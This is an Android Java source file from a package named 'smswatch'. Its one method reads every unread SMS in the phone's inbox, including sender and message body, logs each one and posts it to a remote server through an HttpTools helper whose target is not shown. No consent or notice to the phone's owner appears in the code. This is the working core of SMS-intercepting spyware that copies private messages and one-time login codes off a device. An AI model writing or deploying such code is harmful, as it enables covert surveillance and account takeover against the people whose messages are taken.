package com.wei.smswatch;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;


public class getAllSMS {
    public static void getAllSMS(Context context) throws Exception {
        ContentResolver cresolver = context.getContentResolver();
        Cursor cursor = cresolver.query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "read", "body", "thread_id"},
                "read=?", new String[]{"0"}, "date desc");

        if (cursor == null) {
            return;
        } else {
            SmsInfo smsinfo = new SmsInfo();

            while (cursor.moveToNext()) {
                int idIndex = cursor.getColumnIndex("_id");
                if (idIndex != -1) {
                    smsinfo.id = cursor.getString(idIndex);
                }
                int threadIndex = cursor.getColumnIndex("thread_id");
                if (threadIndex != -1) {
                    smsinfo.thread_id = cursor.getString(threadIndex);
                }
                int addressIndex = cursor.getColumnIndex("address");
                if (addressIndex != -1) {
                    smsinfo.smsAddress = cursor.getString(addressIndex);
                }
                int bodyIndex = cursor.getColumnIndex("body");
                if (bodyIndex != -1) {
                    smsinfo.smsBody = cursor.getString(bodyIndex);
                }
                int readIndex = cursor.getColumnIndex("read");
                if (readIndex != -1) {
                    smsinfo.read = cursor.getString(readIndex);
                }
                Log.i("smswatch", smsinfo.toString());
                HttpTools.SendPostMess(smsinfo.toString());


            }

        }
    }
}
